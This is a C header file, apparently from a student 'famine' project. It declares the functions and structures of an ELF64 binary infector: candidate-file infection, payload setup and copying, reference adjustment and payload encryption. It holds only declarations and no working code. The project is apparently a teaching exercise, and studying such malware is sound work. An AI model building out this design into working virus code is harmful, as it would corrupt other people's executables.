/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/06 04:52:36 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef INFECT_H
# define INFECT_H

# include <fcntl.h>
# include <stdint.h>
# include <unistd.h>
# include <sys/types.h>
# include "famine.h"
# include "accessors.h"

# define SHIFT_ALIGNMENT	4096
# define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))

/*
** file data
*/

struct				famine
{
	struct safe_pointer	original_safe;
	struct safe_pointer	clone_safe;
	struct endians_pointer
	{
		uint16_t	(*endian_2)(uint16_t);
		uint32_t	(*endian_4)(uint32_t);
		uint64_t	(*endian_8)(uint64_t);
	}			endians;
};

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

typedef	bool	(*f_iter_callback)(struct safe_pointer info, const struct endians_pointer endians, size_t offset, void *data);

/*
** encryption
*/

void	encrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);
void	decrypt(uint num_rounds, char *data, uint32_t const key[4], size_t size);

/*
** iterators
*/

bool	foreach_phdr(const struct safe_pointer info, const struct endians_pointer endians,
		f_iter_callback callback, void *data);
bool	foreach_shdr(const struct safe_pointer info, const struct endians_pointer endians,
		f_iter_callback callback, void *data);

/*
** infect
*/

void		infect_if_candidate(const char *file);
bool		elf64_packer(const struct famine food, size_t original_file_size);
bool		find_entry(struct entry *original_entry, struct safe_pointer info, const struct endians_pointer endians);
bool		setup_payload(const struct entry *original_entry, \
			const struct endians_pointer endians, \
			const struct safe_pointer info);
bool		adjust_references(const struct safe_pointer info, \
			const struct endians_pointer endians, \
			size_t shift_amount, const struct entry *original_entry);
bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
			size_t shift_amount, size_t original_size);


/*
** payload
*/

void	begin_payload(void);
void	end_payload(void);

/*
** endian
*/

uint16_t	endian_2_noswap(uint16_t n);
uint16_t	endian_2_swap(uint16_t n);
uint32_t	endian_4_noswap(uint32_t n);
uint32_t	endian_4_swap(uint32_t n);
uint64_t	endian_8_noswap(uint64_t n);
uint64_t	endian_8_swap(uint64_t n);

#endif
